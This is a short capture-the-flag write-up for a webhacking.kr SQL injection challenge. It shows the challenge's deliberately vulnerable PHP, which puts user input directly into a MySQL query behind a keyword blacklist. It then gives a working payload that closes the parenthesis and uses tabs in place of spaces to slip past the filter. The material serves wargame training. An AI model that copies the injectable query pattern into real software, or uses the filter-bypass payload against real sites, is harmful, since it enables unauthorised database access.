# Old 27    SQLi (Parenthesis)

URL: [https://webhacking.kr/challenge/web-12/?view_source=1](https://webhacking.kr/challenge/web-12/?view_source=1)

```php
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
?><html>
<head>
<title>Challenge 27</title>
</head>
<body>
<h1>SQL INJECTION</h1>
<form method=get action=index.php>
<input type=text name=no><input type=submit>
</form>
<?php
  if($_GET['no']){
  $db = dbconnect();
  if(preg_match("/#|select|\(| |limit|=|0x/i",$_GET['no'])) exit("no hack");
  $r=mysqli_fetch_array(mysqli_query($db,"select id from chall27 where id='guest' and no=({$_GET['no']})")) or die("query error");
  if($r['id']=="guest") echo("guest");
  if($r['id']=="admin") solve(27); // admin's no = 2
}
?>
<br><a href=?view_source=1>view-source</a>
</body>
</html>
```

Solution:
```julia
Payload: 2) OR no LIKE 2 -- -
Replace space with tabs: 2)%09OR%09no%09LIKE%092%09--%09-
```

Not sure why `/**/` comment to space trick didn't work...